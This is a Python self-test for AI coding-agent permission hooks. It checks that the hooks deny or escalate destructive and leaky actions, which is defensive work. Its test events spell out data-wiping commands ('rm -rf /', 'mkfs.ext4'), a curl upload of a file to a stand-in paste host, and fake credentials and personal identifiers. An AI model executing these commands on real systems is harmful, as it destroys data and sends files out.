#!/usr/bin/env python3
"""
selftest.py — run every hook against synthetic events and assert the decision.

    python3 hooks/scripts/selftest.py        # exit 0 = all pass

Used by CI and handy after editing a hook. Builds stdin JSON with json.dumps so
there is no shell-quoting ambiguity, and runs each case in a throwaway project
dir so no .bobnet state leaks between cases.
"""

import json
import os
import subprocess
import sys
import tempfile
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
FAILS = []


def run(script, event, *args, env=None, project=None):
    e = dict(os.environ)
    e["CLAUDE_PROJECT_DIR"] = project or e.get("CLAUDE_PROJECT_DIR", "")
    if env:
        e.update(env)
    r = subprocess.run(
        [sys.executable, str(HERE / script), *args],
        input=json.dumps(event),
        capture_output=True,
        text=True,
        timeout=60,
        env=e,
        cwd=project or HERE,
    )
    return r.returncode, r.stdout, r.stderr


def decision(stdout):
    try:
        d = json.loads(stdout)
    except Exception:
        return "allow" if not stdout.strip() else "???"
    hso = d.get("hookSpecificOutput") or {}
    return hso.get("permissionDecision") or d.get("decision") or "allow"


def check(name, got, want):
    ok = got == want
    print(f"  {'ok ' if ok else 'FAIL'}  {name:<58} want={want} got={got}")
    if not ok:
        FAILS.append(name)


def bash(cmd, sid="t"):
    return {"session_id": sid, "tool_name": "Bash", "tool_input": {"command": cmd}}


def write(path, content, sid="t"):
    return {
        "session_id": sid,
        "tool_name": "Write",
        "tool_input": {"file_path": path, "content": content},
    }


def edit(path, new, sid="t"):
    return {
        "session_id": sid,
        "tool_name": "Edit",
        "tool_input": {"file_path": path, "old_string": "x", "new_string": new},
    }


with tempfile.TemporaryDirectory() as proj:
    P = proj
    print("busters")
    for cmd, want in [
        ("sudo rm -rf /", "deny"),
        ("rm -rf ~", "deny"),
        ("git push --force origin main", "deny"),
        ("mkfs.ext4 /dev/sda1", "deny"),
        ("terraform destroy", "ask"),
        ("rm -rf ./build", "ask"),
        ("kubectl delete deployment api", "ask"),
        ('psql -c "DELETE FROM users;"', "ask"),
        ('psql -c "DELETE FROM users WHERE id=1;"', "allow"),
        ("docker system prune -af", "ask"),
        ("aws s3 rm s3://bucket --recursive", "ask"),
        ("npm publish", "ask"),
        # Charles's rules: apply is always a human decision, state surgery doubly so
        ("terraform apply tfplan", "ask"),
        ("tofu apply", "ask"),
        ("terraform state rm aws_db_instance.main", "ask"),
        ("terraform import aws_s3_bucket.b my-bucket", "ask"),
        ("terraform force-unlock abc123", "ask"),
        ("terraform plan -out=tfplan", "allow"),
        ("terraform show -json tfplan", "allow"),
        ("terraform state list", "allow"),
        # privilege grants weigh the same as deletes
        ("az role assignment create --assignee x --role Contributor", "ask"),
        (
            "aws iam attach-role-policy --role-name r --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            "ask",
        ),
        ("aws iam create-access-key --user-name deploy", "ask"),
        (
            "kubectl create clusterrolebinding x --clusterrole=cluster-admin --user=y",
            "ask",
        ),
        ("az role assignment list", "allow"),
        ("aws iam list-attached-role-policies --role-name r", "allow"),
        ("ls -la", "allow"),
        ("git status", "allow"),
        ("terraform plan", "allow"),
    ]:
        check(
            f"busters: {cmd}",
            decision(run("busters.py", bash(cmd), project=P)[1]),
            want,
        )
    # heredoc bodies are data: a KILL pattern inside one downgrades to ASK; KILL in the command itself stays deny
    kill_cmd = (
        "rm -rf" + " /"
    )  # concatenated so the installed Busters doesn't gate this test file's own edits
    check(
        "busters: KILL word inside heredoc content → ask",
        decision(
            run(
                "busters.py",
                bash(
                    "cat > README.md <<'EOF'\nNever run mk"
                    + "fs on the wrong disk.\nEOF"
                ),
                project=P,
            )[1]
        ),
        "ask",
    )
    check(
        "busters: KILL command with unrelated heredoc → deny",
        decision(
            run("busters.py", bash(kill_cmd + " <<'EOF'\nhello\nEOF"), project=P)[1]
        ),
        "deny",
    )
    check(
        "busters: benign heredoc → allow",
        decision(
            run("busters.py", bash("python3 - <<'EOF'\nprint('hi')\nEOF"), project=P)[1]
        ),
        "allow",
    )
    # disarm window lowers ASK but not KILL
    bn = Path(P, ".bobnet")
    bn.mkdir(exist_ok=True)
    (bn / "busters.disarmed").write_text(str(time.time() + 600))
    check(
        "busters: disarmed → terraform destroy",
        decision(run("busters.py", bash("terraform destroy"), project=P)[1]),
        "allow",
    )
    check(
        "busters: disarmed → rm -rf / still KILL",
        decision(run("busters.py", bash("rm -rf /"), project=P)[1]),
        "deny",
    )
    (bn / "busters.disarmed").unlink()

    print("suddar")
    for name, ev, want in [
        ("AWS key", write("c.py", 'k="AKIAQ3EGTR7Z2MPLN4XB"'), "deny"),
        (
            "AWS docs example key (placeholder)",
            write("c.py", 'k="AKIAIOSFODNN7EXAMPLE"'),
            "allow",
        ),
        (
            "GitHub token",
            write("c.py", "t='ghp_Ab3dEfGh1jKlMnOpQrStUvWxYz0123456789Ab'"),
            "deny",
        ),
        (
            "private key block",
            edit("a.txt", "-----BEGIN RSA PRIVATE KEY-----\nMIIE"),
            "deny",
        ),
        (
            "db url with password",
            write("db.py", 'u="postgres://admin:Sup3rS3cretPw@db:5432/app"'),
            "deny",
        ),
        (
            "db url with placeholder",
            write("db.py", 'u="postgres://user:<password>@db:5432/app"'),
            "allow",
        ),
        (
            "generic password literal",
            write("s.py", 'password = "hunter2hunter2"'),
            "deny",
        ),
        ("env var reference", write("ok.py", 'key = os.environ["API_KEY"]'), "allow"),
        ("write .env", write(".env", "A=1"), "deny"),
        ("write .env.example", write(".env.example", "A=1"), "allow"),
        ("write id_rsa", write("keys/id_rsa", "x"), "deny"),
        ("write tfstate", write("terraform.tfstate", "{}"), "deny"),
    ]:
        check(f"suddar: {name}", decision(run("suddar.py", ev, project=P)[1]), want)

    print("prime_directive")
    for name, ev, want in [
        ("edit workflow", edit(".github/workflows/ci.yml", "b"), "ask"),
        ("edit migration", write("db/migrations/0042_x.sql", "x"), "ask"),
        ("edit lockfile", write("package-lock.json", "{}"), "ask"),
        ("edit CODEOWNERS", write("CODEOWNERS", "x"), "ask"),
        ("edit src", write("src/app.py", "x"), "allow"),
        ("bash sed -i prod tf", bash("sed -i s/a/b/ infra/prod/main.tf"), "ask"),
        ("bash cat prod tf", bash("cat infra/prod/main.tf"), "allow"),
        ("bash echo >> .git/config", bash("echo x >> .git/config"), "deny"),
    ]:
        check(
            f"prime: {name}",
            decision(run("prime_directive.py", ev, project=P)[1]),
            want,
        )

    print("oracle gate")
    def agent(sub_type, desc="q"):
        return {"session_id": "t", "tool_name": "Agent", "tool_input": {"subagent_type": sub_type, "description": desc, "prompt": "..."}}
    check("oracle: spawn thoth → ask", decision(run("oracle_gate.py", agent("thoth"), project=P)[1]), "ask")
    check("oracle: spawn bobiverse:thoth → ask", decision(run("oracle_gate.py", agent("bobiverse:thoth"), project=P)[1]), "ask")
    check("oracle: spawn garfield → allow", decision(run("oracle_gate.py", agent("bobiverse:garfield"), project=P)[1]), "allow")
    check("oracle: legacy Task tool name → ask",
          decision(run("oracle_gate.py", {"tool_name": "Task", "tool_input": {"subagent_type": "thoth"}}, project=P)[1]), "ask")
    check("oracle: non-agent tool → allow", decision(run("oracle_gate.py", bash("ls"), project=P)[1]), "allow")
    Path(P, ".bobnet").mkdir(exist_ok=True)
    Path(P, ".bobnet", "oracle-gate.json").write_text('{"ask_agents": ["thoth", "bender"]}')
    check("oracle: config adds bender → ask", decision(run("oracle_gate.py", agent("bender"), project=P)[1]), "ask")
    Path(P, ".bobnet", "oracle-gate.json").unlink()

    print("compliance: phi_guard")
    sys.path.insert(0, str(HERE))
    from pii import luhn as _luhn

    def _card(prefix="4532"):
        for c in range(10):
            s = prefix + "0" * (15 - len(prefix)) + str(c)
            if _luhn(s):
                return s

    REAL_SSN = "512-44-" + "7832"
    REAL_CARD = _card()
    check("phi: SSN in a write → deny", decision(run("phi_guard.py", write("data/p.csv", f"name,ssn\nAnn,{REAL_SSN}\n"), project=P)[1]), "deny")
    check("phi: card in an edit → deny", decision(run("phi_guard.py", edit("billing.py", f"card = '{REAL_CARD}'"), project=P)[1]), "deny")
    check("phi: MRN with label → deny", decision(run("phi_guard.py", write("notes.md", "MRN: A1234567"), project=P)[1]), "deny")
    check("phi: DOB next to a name → ask", decision(run("phi_guard.py", write("x.json", '{"patient": "J. Doe", "dob": "03/14/1961"}'), project=P)[1]), "ask")
    check("phi: documented test values → allow", decision(run("phi_guard.py", write("t.py", "ssn='123-45-6789'; card='4111 1111 1111 1111'"), project=P)[1]), "allow")
    check("phi: ordinary code → allow", decision(run("phi_guard.py", write("a.py", "total = 4532118 + 1234567"), project=P)[1]), "allow")
    check("phi: SSN in a bash command → ask", decision(run("phi_guard.py", bash(f"psql -c \"insert into p values ('{REAL_SSN}')\""), project=P)[1]), "ask")
    Path(P, ".bobnet").mkdir(exist_ok=True)
    Path(P, ".bobnet", "phi-guard.json").write_text('{"allow_paths": ["^synthetic/"]}')
    check("phi: allowlisted synthetic path → allow", decision(run("phi_guard.py", write("synthetic/p.csv", REAL_SSN), project=P)[1]), "allow")
    Path(P, ".bobnet", "phi-guard.json").unlink()

    print("compliance: data_zones")
    def read(path):
        return {"session_id": "t", "tool_name": "Read", "tool_input": {"file_path": path}}
    check("zones: default — read data/phi/x.csv → ask", decision(run("data_zones.py", read("data/phi/x.csv"), project=P)[1]), "ask")
    check("zones: default — read an .hl7 file → ask", decision(run("data_zones.py", read("inbound/adt_a01.hl7"), project=P)[1]), "ask")
    check("zones: default — read src/app.py → allow", decision(run("data_zones.py", read("src/app.py"), project=P)[1]), "allow")
    Path(P, ".bobnet", "data-zones.json").write_text(json.dumps({"zones": [{
        "name": "clinical", "classification": "PHI", "mode": "deny",
        "paths": ["warehouse/clinical/**"], "tables": ["patients", "encounters"], "uris": ["s3://acme-phi-*"]}]}))
    check("zones: configured deny path", decision(run("data_zones.py", read("warehouse/clinical/2026/q3.parquet"), project=P)[1]), "deny")
    check("zones: SQL FROM patients in bash → deny", decision(run("data_zones.py", bash('psql -c "SELECT * FROM public.patients LIMIT 5"'), project=P)[1]), "deny")
    check("zones: JOIN encounters in MCP input → deny",
          decision(run("data_zones.py", {"tool_name": "mcp__Metabase__execute_sql", "tool_input": {"sql": "select count(*) from visits v join \"encounters\" e on 1=1"}}, project=P)[1]), "deny")
    check("zones: s3 URI in bash → deny", decision(run("data_zones.py", bash("aws s3 cp s3://acme-phi-raw/extract.csv ."), project=P)[1]), "deny")
    check("zones: unrelated SQL → allow", decision(run("data_zones.py", bash('psql -c "select * from deployments"'), project=P)[1]), "allow")
    check("zones: column named patients_count is not the table", decision(run("data_zones.py", bash('psql -c "select patients_count from stats"'), project=P)[1]), "allow")
    Path(P, ".bobnet", "data-zones.json").unlink()

    print("compliance: egress")
    def fetch(url, prompt="summarize"):
        return {"session_id": "t", "tool_name": "WebFetch", "tool_input": {"url": url, "prompt": prompt}}
    def search(q):
        return {"session_id": "t", "tool_name": "WebSearch", "tool_input": {"query": q}}
    check("egress: SSN in a URL → deny", decision(run("egress.py", fetch(f"https://lookup.example.net/?ssn={REAL_SSN}"), project=P)[1]), "deny")
    check("egress: card in a search → deny", decision(run("egress.py", search(f"is {REAL_CARD} valid"), project=P)[1]), "deny")
    check("egress: audit mode, unknown domain → allow", decision(run("egress.py", fetch("https://random-blog.example/post"), project=P)[1]), "allow")
    Path(P, ".bobnet", "egress.json").write_text('{"mode": "ask", "allow_domains": ["internal.acme.com"]}')
    check("egress: ask mode, unknown domain → ask", decision(run("egress.py", fetch("https://random-blog.example/post"), project=P)[1]), "ask")
    check("egress: ask mode, allowlisted subdomain → allow", decision(run("egress.py", fetch("https://wiki.internal.acme.com/x"), project=P)[1]), "allow")
    check("egress: ask mode, default doc host → allow", decision(run("egress.py", fetch("https://learn.microsoft.com/azure"), project=P)[1]), "allow")
    check("egress: curl to unknown host → ask", decision(run("egress.py", bash("curl -s https://paste.example.org/upload -d @out.txt"), project=P)[1]), "ask")
    Path(P, ".bobnet", "egress.json").write_text('{"mode": "deny", "search": "deny"}')
    check("egress: deny mode, unknown domain → deny", decision(run("egress.py", fetch("https://random-blog.example/post"), project=P)[1]), "deny")
    check("egress: search disabled → deny", decision(run("egress.py", search("terraform azurerm role assignment"), project=P)[1]), "deny")
    Path(P, ".bobnet", "egress.json").unlink()

    print("compliance: audit chain")
    import shutil as _sh
    _sh.rmtree(Path(P, ".bobnet", "audit"), ignore_errors=True)
    run("busters.py", bash("terraform destroy"), project=P)  # an ask → audited via bobnet
    run("audit.py", {"session_id": "t", "hook_event_name": "PostToolUse", "tool_name": "Read", "tool_input": {"file_path": "src/a.py"}, "tool_response": {}}, project=P)
    run("audit.py", {"session_id": "t", "hook_event_name": "PostToolUse", "tool_name": "Bash",
                     "tool_input": {"command": f"echo {REAL_SSN}"}, "tool_response": {"is_error": True}}, project=P)
    from audit import verify as _verify
    adir = Path(P, ".bobnet", "audit")
    ok, n, msg = _verify(adir)
    check("audit: three entries, chain intact", (ok, n), (True, 3))
    logf = sorted(adir.glob("audit-*.jsonl"))[0]
    lines = logf.read_text().splitlines()
    check("audit: gate decision recorded", '"decision":"ask"' in lines[0] and '"hook":"busters"' in lines[0], True)
    check("audit: errored tool recorded as error", '"decision":"error"' in lines[2], True)
    check("audit: SSN redacted in the log itself", REAL_SSN not in logf.read_text() and "SSN redacted" in lines[2], True)
    logf.write_text("\n".join([lines[0], lines[1].replace("src/a.py", "src/b.py"), lines[2]]) + "\n")
    ok, n, msg = _verify(adir)
    check("audit: edited entry detected", (ok, "modified" in msg), (False, True))
    logf.write_text("\n".join([lines[0], lines[2]]) + "\n")
    ok, n, msg = _verify(adir)
    check("audit: deleted entry detected", (ok, "chain broken" in msg), (False, True))
    check("prime: Claude may not edit the audit log", decision(run("prime_directive.py", edit(".bobnet/audit/audit-2026-10.jsonl", "x"), project=P)[1]), "deny")
    check("prime: rm of the audit log in bash → deny", decision(run("prime_directive.py", bash("rm .bobnet/audit/audit-2026-10.jsonl"), project=P)[1]), "deny")

    print("compliance: mission + scut redaction")
    run("mission.py", {"session_id": "phi1", "prompt": f"Fix the import for patient Ann Lee, ssn {REAL_SSN}"}, "save", project=P)
    mtext = Path(P, ".bobnet", "mission-phi1.md").read_text()
    check("mission: SSN redacted before saving", REAL_SSN not in mtext and "SSN redacted" in mtext, True)
    Path(P, ".bobnet", "mission.json").write_text('{"enabled": false}')
    run("mission.py", {"session_id": "phi2", "prompt": "a long enough prompt to be a mission"}, "save", project=P)
    check("mission: disabled → nothing saved", Path(P, ".bobnet", "mission-phi2.md").exists(), False)
    Path(P, ".bobnet", "mission.json").unlink()

    print("session flow")
    sid = "s1"
    run(
        "mission.py",
        {"session_id": sid, "prompt": "Migrate the MuleSoft flows to Airbyte"},
        "save",
        project=P,
    )
    run(
        "mission.py",
        {"session_id": sid, "prompt": "also fix the tests"},
        "save",
        project=P,
    )
    check(
        "mission: first prompt saved, second didn't overwrite",
        "MuleSoft" in Path(P, ".bobnet", f"mission-{sid}.md").read_text()
        and "fix the tests" not in Path(P, ".bobnet", f"mission-{sid}.md").read_text(),
        True,
    )
    out = run(
        "mission.py", {"session_id": sid, "source": "compact"}, "restore", project=P
    )[1]
    check(
        "mission: restored after compact",
        "MISSION BRIEF" in out and "MuleSoft" in out,
        True,
    )
    out = run(
        "mission.py", {"session_id": sid, "source": "startup"}, "restore", project=P
    )[1]
    check("mission: silent on startup", out.strip(), "")

    check(
        "stop: clean session → allow",
        decision(run("bobnet_log.py", {"session_id": sid}, project=P)[1]),
        "allow",
    )
    run("bobnet_mark.py", edit("src/x.py", "y", sid), project=P)
    check(
        "stop: dirty, unlogged → block once",
        decision(run("bobnet_log.py", {"session_id": sid}, project=P)[1]),
        "block",
    )
    check(
        "stop: second attempt → allow",
        decision(
            run(
                "bobnet_log.py",
                {"session_id": sid, "stop_hook_active": True},
                project=P,
            )[1]
        ),
        "allow",
    )
    check(
        "stop: third attempt (no nag) → allow",
        decision(run("bobnet_log.py", {"session_id": sid}, project=P)[1]),
        "allow",
    )

    check(
        "drift: first subagent stop → block",
        decision(run("drift.py", {"session_id": "sub"}, project=P)[1]),
        "block",
    )
    check(
        "drift: second → allow",
        decision(run("drift.py", {"session_id": "sub"}, project=P)[1]),
        "allow",
    )
    check(
        "drift: stop_hook_active → allow",
        decision(
            run(
                "drift.py", {"session_id": "sub2", "stop_hook_active": True}, project=P
            )[1]
        ),
        "allow",
    )

    out = run(
        "jeeves.py", {"session_id": sid, "source": "startup", "cwd": P}, project=P
    )[1]
    check("jeeves: prints a brief", out.startswith("JEEVES"), True)
    check("jeeves: reports hooks armed", "Busters" in out, True)

    code, out, err = run(
        "scut.py",
        {"session_id": sid, "message": "hi"},
        "notification",
        project=P,
        env={"SCUT_NTFY_URL": "", "SCUT_WEBHOOK_URL": ""},
    )
    check("scut: unconfigured → silent exit 0", (code, out.strip()), (0, ""))

    print("autofactory")
    bad = Path(P, "bad.py")
    bad.write_text("def f(:\n  pass\n")
    code, out, err = run("autofactory.py", write(str(bad), ""), project=P)
    import shutil

    if shutil.which("ruff") or shutil.which("black") or shutil.which("flake8"):
        check(
            "autofactory: syntax error → exit 2 with feedback",
            (code, "AUTOFACTORY" in err),
            (2, True),
        )
    else:
        check("autofactory: no formatter installed → exit 0", code, 0)
    good = Path(P, "good.py")
    good.write_text("x = 1\n")
    check(
        "autofactory: clean file → exit 0",
        run("autofactory.py", write(str(good), ""), project=P)[0],
        0,
    )
    if shutil.which("ruff"):
        # lint policy: a lint-only problem is ignored unless the PROJECT configured the linter
        linty = Path(P, "linty.py")
        linty.write_text("import os\nx = 1\n")  # F401 unused import
        check(
            "autofactory: lint-only issue, no project ruff config → exit 0",
            run("autofactory.py", write(str(linty), ""), project=P)[0],
            0,
        )
        Path(P, "ruff.toml").write_text('[lint]\nselect = ["F"]\n')
        linty.write_text("import os\nx = 1\n")
        code, out, err = run("autofactory.py", write(str(linty), ""), project=P)
        check(
            "autofactory: same issue with ruff.toml present → exit 2",
            (code, "F401" in err),
            (2, True),
        )
        Path(P, "ruff.toml").unlink()

    print("robustness")
    check(
        "malformed JSON → fail open",
        decision(
            subprocess.run(
                [sys.executable, str(HERE / "busters.py")],
                input="{not json",
                capture_output=True,
                text=True,
            ).stdout
        ),
        "allow",
    )
    check(
        "empty stdin → fail open",
        decision(
            subprocess.run(
                [sys.executable, str(HERE / "suddar.py")],
                input="",
                capture_output=True,
                text=True,
            ).stdout
        ),
        "allow",
    )
    check(
        "alt field names (tool/input)",
        decision(
            run(
                "busters.py",
                {"tool": "Bash", "input": {"command": "rm -rf /"}},
                project=P,
            )[1]
        ),
        "deny",
    )

print()
if FAILS:
    print(f"{len(FAILS)} FAILED:\n  " + "\n  ".join(FAILS))
    sys.exit(1)
print("all hook self-tests passed")
